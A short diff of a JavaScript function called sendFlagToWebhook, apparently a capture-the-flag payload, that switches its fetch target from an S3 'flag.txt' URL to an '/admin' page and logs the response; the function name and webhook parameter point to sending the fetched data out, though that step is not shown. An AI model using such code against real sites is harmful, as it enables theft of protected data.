@@ -1,6 +1,6 @@
 async function sendFlagToWebhook(webhookUrl) {
   try {
-    const response = await fetch('http://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag.txt');
+    const response = await fetch('/admin');
     const data = await response.text();
     console.log(data);
 
